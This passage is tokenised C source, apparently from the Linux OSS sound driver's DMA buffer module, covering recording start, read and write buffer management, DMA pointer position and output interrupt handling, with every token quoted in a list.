";", "if", "(", "!(", "adev", "-", ">", "enable_bits", "&", "PCM_ENABLE_INPUT", ")", ")", "return", "0", ";", "if", "(", "dmap", "-", ">", "dma_mode", "=", "=", "DMODE_OUTPUT", ")", "{", "/", "*", "Direction", "change", "*", "/", "/", "*", "release", "lock", "-", "it", "'", "s", "not", "recursive", "*", "/", "spin_unlock_irq", "(", "&", "dmap", "-", ">", "lock", ")", ";", "DMAbuf_sync", "(", "dev", ")", ";", "DMAbuf_reset", "(", "dev", ")", ";", "spin_lock_irq", "(", "&", "dmap", "-", ">", "lock", ")", ";", "dmap", "-", ">", "dma_mode", "=", "DMODE_NONE", ";", "}", "if", "(", "!", "dmap", "-", ">", "dma_mode", ")", "{", "reorganize_buffers", "(", "dev", ",", "dmap", ",", "1", ")", ";", "if", "(", "(", "err", "=", "adev", "-", ">", "d", "-", ">", "prepare_for_input", "(", "dev", ",", "dmap", "-", ">", "fragment_size", ",", "dmap", "-", ">", "nbufs", ")", ")", "<", "0", ")", "return", "err", ";", "dmap", "-", ">", "dma_mode", "=", "DMODE_INPUT", ";", "}", "if", "(", "!(", "dmap", "-", ">", "flags", "&", "DMA_ACTIVE", ")", ")", "{", "if", "(", "dmap", "-", ">", "needs_reorg", ")", "reorganize_buffers", "(", "dev", ",", "dmap", ",", "0", ")", ";", "local_start_dma", "(", "adev", ",", "dmap", "-", ">", "raw_buf_phys", ",", "dmap", "-", ">", "bytes_in_use", ",", "DMA_MODE_READ", ")", ";", "adev", "-", ">", "d", "-", ">", "start_input", "(", "dev", ",", "dmap", "-", ">", "raw_buf_phys", "+", "dmap", "-", ">", "qtail", "*", "dmap", "-", ">", "fragment_size", ",", "dmap", "-", ">", "fragment_size", ",", "0", ")", ";", "dmap", "-", ">", "flags", "|", "=", "DMA_ACTIVE", ";", "if", "(", "adev", "-", ">", "d", "-", ">", "trigger", ")", "adev", "-", ">", "d", "-", ">", "trigger", "(", "dev", ",", "adev", "-", ">", "enable_bits", "*", "adev", "-", ">", "go", ")", ";", "}", "return", "0", ";", "}", "/", "*", "acquires", "lock", "*", "/", "int", "DMAbuf_getrdbuffer", "(", "int", "dev", ",", "char", "*", "*", "buf", ",", "int", "*", "len", ",", "int", "dontblock", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "unsigned", "long", "flags", ";", "int", "err", "=", "0", ",", "n", "=", "0", ";", "struct", "dma_buffparms", "*", "dmap", "=", "adev", "-", ">", "dmap_in", ";", "if", "(", "!(", "adev", "-", ">", "open_mode", "&", "OPEN_READ", ")", ")", "return", "-", "EIO", ";", "spin_lock_irqsave", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "if", "(", "dmap", "-", ">", "needs_reorg", ")", "reorganize_buffers", "(", "dev", ",", "dmap", ",", "0", ")", ";", "if", "(", "adev", "-", ">", "dmap_in", "-", ">", "mapping_flags", "&", "DMA_MAP_MAPPED", ")", "{", "/", "*", "printk", "(", "KERN_WARNING", "\"", "Sound", ":", "Can", "'", "t", "read", "from", "mmapped", "device", "(", "1", ")", "\\", "n", "\"", ");", "*/", "spin_unlock_irqrestore", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "return", "-", "EINVAL", ";", "}", "else", "while", "(", "dmap", "-", ">", "qlen", "<", "=", "0", "&", "&", "n", "+", "+", "<", "10", ")", "{", "long", "timeout", "=", "MAX_SCHEDULE_TIMEOUT", ";", "if", "(", "!(", "adev", "-", ">", "enable_bits", "&", "PCM_ENABLE_INPUT", ")", "|", "|", "!", "adev", "-", ">", "go", ")", "{", "spin_unlock_irqrestore", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "return", "-", "EAGAIN", ";", "}", "if", "(", "(", "err", "=", "DMAbuf_activate_recording", "(", "dev", ",", "dmap", ")", ")", "<", "0", ")", "{", "spin_unlock_irqrestore", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "return", "err", ";", "}", "/", "*", "Wait", "for", "the", "next", "block", "*", "/", "if", "(", "dontblock", ")", "{", "spin_unlock_irqrestore", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "return", "-", "EAGAIN", ";", "}", "if", "(", "adev", "-", ">", "go", ")", "timeout", "=", "dmabuf_timeout", "(", "dmap", ")", ";", "spin_unlock_irqrestore", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "timeout", "=", "oss_broken_sleep_on", "(", "&", "adev", "-", ">", "in_sleeper", ",", "timeout", ")", ";", "if", "(", "!", "timeout", ")", "{", "/", "*", "FIXME", ":", "include", "device", "name", "*", "/", "err", "=", "-", "EIO", ";", "printk", "(", "KERN_WARNING", "\"", "Sound", ":", "DMA", "(", "input", ")", "timed", "out", "-", "IRQ", "/", "DRQ", "config", "error", "?", "\\", "n", "\"", ");", "dma_reset_input", "(", "dev", ")", ";", "}", "else", "err", "=", "-", "EINTR", ";", "spin_lock_irqsave", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "}", "spin_unlock_irqrestore", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "if", "(", "dmap", "-", ">", "qlen", "<", "=", "0", ")", "return", "err", "?", "err", ":", "-", "EINTR", ";", "*", "buf", "=", "&", "dmap", "-", ">", "raw_buf", "[", "dmap", "-", ">", "qhead", "*", "dmap", "-", ">", "fragment_size", "+", "dmap", "-", ">", "counts", "[", "dmap", "-", ">", "qhead", "]", "];", "*", "len", "=", "dmap", "-", ">", "fragment_size", "-", "dmap", "-", ">", "counts", "[", "dmap", "-", ">", "qhead", "]", ";", "return", "dmap", "-", ">", "qhead", ";", "}", "int", "DMAbuf_rmchars", "(", "int", "dev", ",", "int", "buff_no", ",", "int", "c", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "struct", "dma_buffparms", "*", "dmap", "=", "adev", "-", ">", "dmap_in", ";", "int", "p", "=", "dmap", "-", ">", "counts", "[", "dmap", "-", ">", "qhead", "]", "+", "c", ";", "if", "(", "dmap", "-", ">", "mapping_flags", "&", "DMA_MAP_MAPPED", ")", "{", "/", "*", "printk", "(", "\"", "Sound", ":", "Can", "'", "t", "read", "from", "mmapped", "device", "(", "2", ")", "\\", "n", "\"", ");", "*/", "return", "-", "EINVAL", ";", "}", "else", "if", "(", "dmap", "-", ">", "qlen", "<", "=", "0", ")", "return", "-", "EIO", ";", "else", "if", "(", "p", ">", "=", "dmap", "-", ">", "fragment_size", ")", "{", "/", "*", "This", "buffer", "is", "completely", "empty", "*", "/", "dmap", "-", ">", "counts", "[", "dmap", "-", ">", "qhead", "]", "=", "0", ";", "dmap", "-", ">", "qlen", "-", "-;", "dmap", "-", ">", "qhead", "=", "(", "dmap", "-", ">", "qhead", "+", "1", ")", "%", "dmap", "-", ">", "nbufs", ";", "}", "else", "dmap", "-", ">", "counts", "[", "dmap", "-", ">", "qhead", "]", "=", "p", ";", "return", "0", ";", "}", "/", "*", "MUST", "be", "called", "with", "dmap", "-", ">", "lock", "hold", "*", "/", "int", "DMAbuf_get_buffer_pointer", "(", "int", "dev", ",", "struct", "dma_buffparms", "*", "dmap", ",", "int", "direction", ")", "{", "/", "*", "*", "Try", "to", "approximate", "the", "active", "byte", "position", "of", "the", "DMA", "pointer", "within", "the", "*", "buffer", "area", "as", "well", "as", "possible", ".", "*", "/", "int", "pos", ";", "unsigned", "long", "f", ";", "if", "(", "!(", "dmap", "-", ">", "flags", "&", "DMA_ACTIVE", ")", ")", "pos", "=", "0", ";", "else", "{", "int", "chan", "=", "dmap", "-", ">", "dma", ";", "f", "=", "claim_dma_lock", "(", ");", "clear_dma_ff", "(", "chan", ")", ";", "if", "(", "!", "isa_dma_bridge_buggy", ")", "disable_dma", "(", "dmap", "-", ">", "dma", ")", ";", "pos", "=", "get_dma_residue", "(", "chan", ")", ";", "pos", "=", "dmap", "-", ">", "bytes_in_use", "-", "pos", ";", "if", "(", "!(", "dmap", "-", ">", "mapping_flags", "&", "DMA_MAP_MAPPED", ")", ")", "{", "if", "(", "direction", "=", "=", "DMODE_OUTPUT", ")", "{", "if", "(", "dmap", "-", ">", "qhead", "=", "=", "0", ")", "if", "(", "pos", ">", "dmap", "-", ">", "fragment_size", ")", "pos", "=", "0", ";", "}", "else", "{", "if", "(", "dmap", "-", ">", "qtail", "=", "=", "0", ")", "if", "(", "pos", ">", "dmap", "-", ">", "fragment_size", ")", "pos", "=", "0", ";", "}", "}", "if", "(", "pos", "<", "0", ")", "pos", "=", "0", ";", "if", "(", "pos", ">", "=", "dmap", "-", ">", "bytes_in_use", ")", "pos", "=", "0", ";", "if", "(", "!", "isa_dma_bridge_buggy", ")", "enable_dma", "(", "dmap", "-", ">", "dma", ")", ";", "release_dma_lock", "(", "f", ")", ";", "}", "/", "*", "printk", "(", "\"", "%", "04x", "\"", ",", "pos", ")", ";", "*", "/", "return", "pos", ";", "}", "/", "*", "*", "DMAbuf_start_devices", "(", ")", "is", "called", "by", "the", "/", "dev", "/", "music", "driver", "to", "start", "*", "one", "or", "more", "audio", "devices", "at", "desired", "moment", ".", "*", "/", "void", "DMAbuf_start_devices", "(", "unsigned", "int", "devmask", ")", "{", "struct", "audio_operations", "*", "adev", ";", "int", "dev", ";", "for", "(", "dev", "=", "0", ";", "dev", "<", "num_audiodevs", ";", "dev", "+", "+)", "{", "if", "(", "!(", "devmask", "&", "(", "1", "<", "<", "dev", ")", "))", "continue", ";", "if", "(", "!(", "adev", "=", "audio_devs", "[", "dev", "]", "))", "continue", ";", "if", "(", "adev", "-", ">", "open_mode", "=", "=", "0", ")", "continue", ";", "if", "(", "adev", "-", ">", "go", ")", "continue", ";", "/", "*", "OK", "to", "start", "the", "device", "*", "/", "adev", "-", ">", "go", "=", "1", ";", "if", "(", "adev", "-", ">", "d", "-", ">", "trigger", ")", "adev", "-", ">", "d", "-", ">", "trigger", "(", "dev", ",", "adev", "-", ">", "enable_bits", "*", "adev", "-", ">", "go", ")", ";", "}", "}", "/", "*", "via", "poll", "called", "without", "a", "lock", "?", "*/", "int", "DMAbuf_space_in_queue", "(", "int", "dev", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "int", "len", ",", "max", ",", "tmp", ";", "struct", "dma_buffparms", "*", "dmap", "=", "adev", "-", ">", "dmap_out", ";", "int", "lim", "=", "dmap", "-", ">", "nbufs", ";", "if", "(", "lim", "<", "2", ")", "lim", "=", "2", ";", "if", "(", "dmap", "-", ">", "qlen", ">", "=", "lim", ")", "/", "*", "No", "space", "at", "all", "*", "/", "return", "0", ";", "/", "*", "*", "Verify", "that", "there", "are", "no", "more", "pending", "buffers", "than", "the", "limit", "*", "defined", "by", "the", "process", ".", "*", "/", "max", "=", "dmap", "-", ">", "max_fragments", ";", "if", "(", "max", ">", "lim", ")", "max", "=", "lim", ";", "len", "=", "dmap", "-", ">", "qlen", ";", "if", "(", "adev", "-", ">", "d", "-", ">", "local_qlen", ")", "{", "tmp", "=", "adev", "-", ">", "d", "-", ">", "local_qlen", "(", "dev", ")", ";", "if", "(", "tmp", "&", "&", "len", ")", "tmp", "-", "-;", "/", "*", "This", "buffer", "has", "been", "counted", "twice", "*", "/", "len", "+", "=", "tmp", ";", "}", "if", "(", "dmap", "-", ">", "byte_counter", "%", "dmap", "-", ">", "fragment_size", ")", "/", "*", "There", "is", "a", "partial", "fragment", "*", "/", "len", "=", "len", "+", "1", ";", "if", "(", "len", ">", "=", "max", ")", "return", "0", ";", "return", "max", "-", "len", ";", "}", "/", "*", "MUST", "not", "hold", "the", "spinlock", "-", "this", "function", "may", "sleep", "*", "/", "static", "int", "output_sleep", "(", "int", "dev", ",", "int", "dontblock", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "int", "err", "=", "0", ";", "struct", "dma_buffparms", "*", "dmap", "=", "adev", "-", ">", "dmap_out", ";", "long", "timeout", ";", "long", "timeout_value", ";", "if", "(", "dontblock", ")", "return", "-", "EAGAIN", ";", "if", "(", "!(", "adev", "-", ">", "enable_bits", "&", "PCM_ENABLE_OUTPUT", ")", ")", "return", "-", "EAGAIN", ";", "/", "*", "*", "Wait", "for", "free", "space", "*", "/", "if", "(", "signal_pending", "(", "current", ")", ")", "return", "-", "EINTR", ";", "timeout", "=", "(", "adev", "-", ">", "go", "&", "&", "!", "(", "dmap", "-", ">", "flags", "&", "DMA_NOTIMEOUT", ")", ");", "if", "(", "timeout", ")", "timeout_value", "=", "dmabuf_timeout", "(", "dmap", ")", ";", "else", "timeout_value", "=", "MAX_SCHEDULE_TIMEOUT", ";", "timeout_value", "=", "oss_broken_sleep_on", "(", "&", "adev", "-", ">", "out_sleeper", ",", "timeout_value", ")", ";", "if", "(", "timeout", "!", "=", "MAX_SCHEDULE_TIMEOUT", "&", "&", "!", "timeout_value", ")", "{", "printk", "(", "KERN_WARNING", "\"", "Sound", ":", "DMA", "(", "output", ")", "timed", "out", "-", "IRQ", "/", "DRQ", "config", "error", "?", "\\", "n", "\"", ");", "dma_reset_output", "(", "dev", ")", ";", "}", "else", "{", "if", "(", "signal_pending", "(", "current", ")", ")", "err", "=", "-", "EINTR", ";", "}", "return", "err", ";", "}", "/", "*", "called", "with", "the", "lock", "held", "*", "/", "static", "int", "find_output_space", "(", "int", "dev", ",", "char", "*", "*", "buf", ",", "int", "*", "size", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "struct", "dma_buffparms", "*", "dmap", "=", "adev", "-", ">", "dmap_out", ";", "unsigned", "long", "active_offs", ";", "long", "len", ",", "offs", ";", "int", "maxfrags", ";", "int", "occupied_bytes", "=", "(", "dmap", "-", ">", "user_counter", "%", "dmap", "-", ">", "fragment_size", ")", ";", "*", "buf", "=", "dmap", "-", ">", "raw_buf", ";", "if", "(", "!(", "maxfrags", "=", "DMAbuf_space_in_queue", "(", "dev", ")", ")", "&", "&", "!", "occupied_bytes", ")", "return", "0", ";", "#", "ifdef", "BE_CONSERVATIVE", "active_offs", "=", "dmap", "-", ">", "byte_counter", "+", "dmap", "-", ">", "qhead", "*", "dmap", "-", ">", "fragment_size", ";", "#", "else", "active_offs", "=", "max", "(", "DMAbuf_get_buffer_pointer", "(", "dev", ",", "dmap", ",", "DMODE_OUTPUT", ")", ",", "0", ")", ";", "/", "*", "Check", "for", "pointer", "wrapping", "situation", "*", "/", "if", "(", "active_offs", ">", "=", "dmap", "-", ">", "bytes_in_use", ")", "active_offs", "=", "0", ";", "active_offs", "+", "=", "dmap", "-", ">", "byte_counter", ";", "#", "endif", "offs", "=", "(", "dmap", "-", ">", "user_counter", "%", "dmap", "-", ">", "bytes_in_use", ")", "&", "~", "SAMPLE_ROUNDUP", ";", "if", "(", "offs", "<", "0", "|", "|", "offs", ">", "=", "dmap", "-", ">", "bytes_in_use", ")", "{", "printk", "(", "KERN_ERR", "\"", "Sound", ":", "Got", "unexpected", "offs", "%", "ld", ".", "Giving", "up", ".", "\\", "n", "\"", ",", "offs", ")", ";", "printk", "(", "\"", "Counter", "=", "%", "ld", ",", "bytes", "=", "%", "d", "\\", "n", "\"", ",", "dmap", "-", ">", "user_counter", ",", "dmap", "-", ">", "bytes_in_use", ")", ";", "return", "0", ";", "}", "*", "buf", "=", "dmap", "-", ">", "raw_buf", "+", "offs", ";", "len", "=", "active_offs", "+", "dmap", "-", ">", "bytes_in_use", "-", "dmap", "-", ">", "user_counter", ";", "/", "*", "Number", "of", "unused", "bytes", "in", "buffer", "*", "/", "if", "(", "(", "offs", "+", "len", ")", ">", "dmap", "-", ">", "bytes_in_use", ")", "len", "=", "dmap", "-", ">", "bytes_in_use", "-", "offs", ";", "if", "(", "len", "<", "0", ")", "{", "return", "0", ";", "}", "if", "(", "len", ">", "(", "(", "maxfrags", "*", "dmap", "-", ">", "fragment_size", ")", "-", "occupied_bytes", ")", ")", "len", "=", "(", "maxfrags", "*", "dmap", "-", ">", "fragment_size", ")", "-", "occupied_bytes", ";", "*", "size", "=", "len", "&", "~", "SAMPLE_ROUNDUP", ";", "return", "(", "*", "size", ">", "0", ")", ";", "}", "/", "*", "acquires", "lock", "*", "/", "int", "DMAbuf_getwrbuffer", "(", "int", "dev", ",", "char", "*", "*", "buf", ",", "int", "*", "size", ",", "int", "dontblock", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "unsigned", "long", "flags", ";", "int", "err", "=", "-", "EIO", ";", "struct", "dma_buffparms", "*", "dmap", "=", "adev", "-", ">", "dmap_out", ";", "if", "(", "dmap", "-", ">", "mapping_flags", "&", "DMA_MAP_MAPPED", ")", "{", "/", "*", "printk", "(", "KERN_DEBUG", "\"", "Sound", ":", "Can", "'", "t", "write", "to", "mmapped", "device", "(", "3", ")", "\\", "n", "\"", ");", "*/", "return", "-", "EINVAL", ";", "}", "spin_lock_irqsave", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "if", "(", "dmap", "-", ">", "needs_reorg", ")", "reorganize_buffers", "(", "dev", ",", "dmap", ",", "0", ")", ";", "if", "(", "dmap", "-", ">", "dma_mode", "=", "=", "DMODE_INPUT", ")", "{", "/", "*", "Direction", "change", "*", "/", "spin_unlock_irqrestore", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "DMAbuf_reset", "(", "dev", ")", ";", "spin_lock_irqsave", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "}", "dmap", "-", ">", "dma_mode", "=", "DMODE_OUTPUT", ";", "while", "(", "find_output_space", "(", "dev", ",", "buf", ",", "size", ")", "<", "=", "0", ")", "{", "spin_unlock_irqrestore", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "if", "(", "(", "err", "=", "output_sleep", "(", "dev", ",", "dontblock", ")", ")", "<", "0", ")", "{", "return", "err", ";", "}", "spin_lock_irqsave", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "}", "spin_unlock_irqrestore", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "return", "0", ";", "}", "/", "*", "has", "to", "acquire", "dmap", "-", ">", "lock", "*", "/", "int", "DMAbuf_move_wrpointer", "(", "int", "dev", ",", "int", "l", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "struct", "dma_buffparms", "*", "dmap", "=", "adev", "-", ">", "dmap_out", ";", "unsigned", "long", "ptr", ";", "unsigned", "long", "end_ptr", ",", "p", ";", "int", "post", ";", "unsigned", "long", "flags", ";", "spin_lock_irqsave", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "post", "=", "(", "dmap", "-", ">", "flags", "&", "DMA_POST", ")", ";", "ptr", "=", "(", "dmap", "-", ">", "user_counter", "/", "dmap", "-", ">", "fragment_size", ")", "*", "dmap", "-", ">", "fragment_size", ";", "dmap", "-", ">", "flags", "&", "=", "~", "DMA_POST", ";", "dmap", "-", ">", "cfrag", "=", "-", "1", ";", "dmap", "-", ">", "user_counter", "+", "=", "l", ";", "dmap", "-", ">", "flags", "|", "=", "DMA_DIRTY", ";", "if", "(", "dmap", "-", ">", "byte_counter", ">", "=", "dmap", "-", ">", "max_byte_counter", ")", "{", "/", "*", "Wrap", "the", "byte", "counters", "*", "/", "long", "decr", "=", "dmap", "-", ">", "byte_counter", ";", "dmap", "-", ">", "byte_counter", "=", "(", "dmap", "-", ">", "byte_counter", "%", "dmap", "-", ">", "bytes_in_use", ")", ";", "decr", "-", "=", "dmap", "-", ">", "byte_counter", ";", "dmap", "-", ">", "user_counter", "-", "=", "decr", ";", "}", "end_ptr", "=", "(", "dmap", "-", ">", "user_counter", "/", "dmap", "-", ">", "fragment_size", ")", "*", "dmap", "-", ">", "fragment_size", ";", "p", "=", "(", "dmap", "-", ">", "user_counter", "-", "1", ")", "%", "dmap", "-", ">", "bytes_in_use", ";", "dmap", "-", ">", "neutral_byte", "=", "dmap", "-", ">", "raw_buf", "[", "p", "]", ";", "/", "*", "Update", "the", "fragment", "based", "bookkeeping", "too", "*", "/", "while", "(", "ptr", "<", "end_ptr", ")", "{", "dmap", "-", ">", "counts", "[", "dmap", "-", ">", "qtail", "]", "=", "dmap", "-", ">", "fragment_size", ";", "dmap", "-", ">", "qtail", "=", "(", "dmap", "-", ">", "qtail", "+", "1", ")", "%", "dmap", "-", ">", "nbufs", ";", "dmap", "-", ">", "qlen", "+", "+;", "ptr", "+", "=", "dmap", "-", ">", "fragment_size", ";", "}", "dmap", "-", ">", "counts", "[", "dmap", "-", ">", "qtail", "]", "=", "dmap", "-", ">", "user_counter", "-", "ptr", ";", "/", "*", "*", "Let", "the", "low", "level", "driver", "perform", "some", "postprocessing", "to", "*", "the", "written", "data", ".", "*", "/", "if", "(", "adev", "-", ">", "d", "-", ">", "postprocess_write", ")", "adev", "-", ">", "d", "-", ">", "postprocess_write", "(", "dev", ")", ";", "if", "(", "!(", "dmap", "-", ">", "flags", "&", "DMA_ACTIVE", ")", ")", "if", "(", "dmap", "-", ">", "qlen", ">", "1", "|", "|", "(", "dmap", "-", ">", "qlen", ">", "0", "&", "&", "(", "post", "|", "|", "dmap", "-", ">", "qlen", ">", "=", "dmap", "-", ">", "nbufs", "-", "1", ")", "))", "DMAbuf_launch_output", "(", "dev", ",", "dmap", ")", ";", "spin_unlock_irqrestore", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "return", "0", ";", "}", "int", "DMAbuf_start_dma", "(", "int", "dev", ",", "unsigned", "long", "physaddr", ",", "int", "count", ",", "int", "dma_mode", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "struct", "dma_buffparms", "*", "dmap", "=", "(", "dma_mode", "=", "=", "DMA_MODE_WRITE", ")", "?", "adev", "-", ">", "dmap_out", ":", "adev", "-", ">", "dmap_in", ";", "if", "(", "dmap", "-", ">", "raw_buf", "=", "=", "NULL", ")", "{", "printk", "(", "KERN_ERR", "\"", "sound", ":", "DMA", "buffer", "(", "1", ")", "=", "=", "NULL", "\\", "n", "\"", ");", "printk", "(", "\"", "Device", "%", "d", ",", "chn", "=", "%", "s", "\\", "n", "\"", ",", "dev", ",", "(", "dmap", "=", "=", "adev", "-", ">", "dmap_out", ")", "?", "\"", "out", "\"", ":", "\"", "in", "\"", ");", "return", "0", ";", "}", "if", "(", "dmap", "-", ">", "dma", "<", "0", ")", "return", "0", ";", "sound_start_dma", "(", "dmap", ",", "physaddr", ",", "count", ",", "dma_mode", ")", ";", "return", "count", ";", "}", "EXPORT_SYMBOL", "(", "DMAbuf_start_dma", ")", ";", "static", "int", "local_start_dma", "(", "struct", "audio_operations", "*", "adev", ",", "unsigned", "long", "physaddr", ",", "int", "count", ",", "int", "dma_mode", ")", "{", "struct", "dma_buffparms", "*", "dmap", "=", "(", "dma_mode", "=", "=", "DMA_MODE_WRITE", ")", "?", "adev", "-", ">", "dmap_out", ":", "adev", "-", ">", "dmap_in", ";", "if", "(", "dmap", "-", ">", "raw_buf", "=", "=", "NULL", ")", "{", "printk", "(", "KERN_ERR", "\"", "sound", ":", "DMA", "buffer", "(", "2", ")", "=", "=", "NULL", "\\", "n", "\"", ");", "printk", "(", "KERN_ERR", "\"", "Device", "%", "s", ",", "chn", "=", "%", "s", "\\", "n", "\"", ",", "adev", "-", ">", "name", ",", "(", "dmap", "=", "=", "adev", "-", ">", "dmap_out", ")", "?", "\"", "out", "\"", ":", "\"", "in", "\"", ");", "return", "0", ";", "}", "if", "(", "dmap", "-", ">", "flags", "&", "DMA_NODMA", ")", "return", "1", ";", "if", "(", "dmap", "-", ">", "dma", "<", "0", ")", "return", "0", ";", "sound_start_dma", "(", "dmap", ",", "dmap", "-", ">", "raw_buf_phys", ",", "dmap", "-", ">", "bytes_in_use", ",", "dma_mode", "|", "DMA_AUTOINIT", ")", ";", "dmap", "-", ">", "flags", "|", "=", "DMA_STARTED", ";", "return", "count", ";", "}", "static", "void", "finish_output_interrupt", "(", "int", "dev", ",", "struct", "dma_buffparms", "*", "dmap", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "if", "(", "dmap", "-", ">", "audio_callback", "!", "=", "NULL", ")", "dmap", "-", ">", "audio_callback", "(", "dev", ",", "dmap", "-", ">", "callback_parm", ")", ";", "wake_up", "(", "&", "adev", "-", ">", "out_sleeper", ")", ";", "wake_up", "(", "&", "adev", "-", ">", "poll_sleeper", ")", ";", "}", "/", "*", "called", "with", "dmap", "-", ">", "lock", "held", "in", "irq", "context", "*", "/", "static", "void", "do_outputintr", "(", "int", "dev", ",", "int", "dummy", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "struct", "dma_buffparms", "*", "dmap", "=", "adev", "-", ">", "dmap_out", ";", "int", "this_fragment", ";", "if", "(", "dmap", "-", ">", "raw_buf", "=", "=", "NULL", ")", "{", "printk", "(", "KERN_ERR", "\"", "Sound", ":", "Error", ".", "Audio", "interrupt", "(", "%", "d", ")", "after", "freeing", "buffers", ".", "\\", "n", "\"", ",", "dev", ")", ";", "return", ";", "}", "if", "(", "dmap", "-", ">", "mapping_flags", "&", "DMA_MAP_MAPPED", ")", "{", "/", "*", "Virtual", "memory", "mapped", "access", "*", "/", "/", "*", "mmapped", "access", "*", "/", "dmap", "-", ">", "qhead", "=", "(", "dmap", "-", ">", "qhead", "+", "1", ")", "%", "dmap", "-", ">", "nbufs", ";", "if", "(", "dmap", "-", ">", "qhead", "=", "=", "0", ")", "{", "/", "*", "Wrapped", "*", "/", "dmap", "-", ">", "byte_counter", "+", "=", "dmap", "-", ">", "bytes_in_use", ";", "if", "(", "dmap", "-", ">", "byte_counter", ">", "=", "dmap", "-", ">", "max_byte_counter", ")", "{", "/", "*", "Overflow", "*", "/", "long", "decr", "=", "dmap", "-", ">", "byte_counter", ";", "dmap", "-", ">", "byte_counter", "=", "(", "dmap", "-", ">", "byte_counter", "%", "dmap", "-", ">", "bytes_in_use", ")", ";", "decr", "-", "=", "dmap", "-", ">", "byte_counter", ";", "dmap", "-", ">", "user_counter", "-", "=", "decr", ";", "}", "}", "dmap", "-", ">", "qlen", "+", "+;", "/", "*", "Yes", "increment", "it", "(", "don", "'", "t", "decrement", ")", "*", "/", "if", "(", "!(", "adev", "-", ">", "flags", "&", "DMA_AUTOMODE", ")", ")", "dmap", "-", ">", "flags", "&", "=", "~", "DMA_ACTIVE", ";", "dmap", "-", ">", "counts", "[", "dmap", "-", ">", "qhead", "]", "=", "dmap", "-", ">", "fragment_size", ";", "DMAbuf_launch_output", "(", "dev", ",", "dmap", ")", ";", "finish_output_interrupt", "(", "dev", ",", "dmap", ")", ";", "return", ";", "}", "dmap", "-", ">", "qlen", "-", "-;", "this_fragment", "=", "dmap", "-", ">", "qhead", ";", "dmap", "-", ">", "qhead", "=", "(", "dmap", "-", ">", "qhead", "+", "1", ")", "%", "dmap", "-", ">", "nbufs", ";", "if", "(", "dmap", "-", ">", "qhead", "=", "=", "0", ")", "{", "/", "*", "Wrapped", "*", "/", "dmap", "-", ">", "byte_counter", "+", "=", "dmap", "-", ">", "bytes_in_use", ";", "if", "(", "dmap", "-", ">", "byte_counter", ">", "=", "dmap", "-", ">", "max_byte_counter", ")", "{", "/", "*", "Overflow", "*", "/", "long", "decr", "=", "dmap", "-", ">", "byte_counter", ";", "dmap", "-", ">", "byte_counter", "=", "(", "dmap", "-", ">", "byte_counter", "%", "dmap", "-", ">", "bytes_in_use", ")", ";", "decr", "-", "=", "dmap", "-", ">", "byte_counter", ";", "dmap", "-", ">", "user_counter", "-", "=", "decr", ";", "}", "}", "if", "(", "!(", "adev", "-", ">", "flags", "&", "DMA_AUTOMODE", ")", ")", "dmap", "-", ">", "flags", "&", "=", "~", "DMA_ACTIVE", ";", "/", "*", "*", "This", "is", "dmap", "-", ">", "qlen", "<", "=", "0", "except", "when", "closing", "when", "*", "dmap", "-", ">", "qlen", "<", "0", "*", "/", "while", "(", "dmap", "-", ">", "qlen", "<", "=", "-", "dmap", "-", ">", "closing", ")", "{", "dmap", "-", ">", "underrun_count", "+", "+;", "dmap", "-", ">", "qlen", "+", "+;", "if", "(", "(", "dmap", "-", ">", "flags", "&", "DMA_DIRTY", ")", "&", "&", "dmap", "-", ">", "applic_profile", "!", "=", "APF_CPUINTENS", ")", "{", "dmap", "-", ">", "flags", "&", "=", "~", "DMA_DIRTY", ";", "memset", "(", "adev", "-", ">", "dmap_out", "-", ">", "raw_buf", ",", "adev", "-", ">", "dmap_out", "-", ">", "neutral_byte", ",", "adev", "-", ">", "dmap_out", "-", ">", "buffsize", ")", ";", "}", "dmap", "-", ">", "user_counter", "+", "=", "dmap", "-", ">", "fragment_size", ";", "dmap", "-", ">", "qtail", "=", "(", "dmap", "-", ">", "qtail", "+", "1", ")", "%", "dmap", "-", ">", "nbufs", ";", "}", "if", "(", "dmap", "-", ">", "qlen", ">", "0", ")", "DMAbuf_launch_output", "(", "dev", ",", "dmap", ")", ";", "finish_output_interrupt", "(", "dev", ",", "dmap", ")", ";", "}", "/", "*", "called", "in", "irq", "context", "*", "/", "void", "DMAbuf_outputintr", "(", "int", "dev", ",", "int", "notify_only", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "unsigned", "long", "flags", ";", "struct", "dma_buffparms", "*", "dmap", "=", "adev", "-", ">", "dmap_out", ";", "spin_lock_irqsave", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "if", "(", "!(", "dmap", "-", ">", "flags", "&", "DMA_NODMA", ")", ")", "{", "int", "chan", "=", "dmap", "-", ">", "dma", ",", "pos", ",", "n", 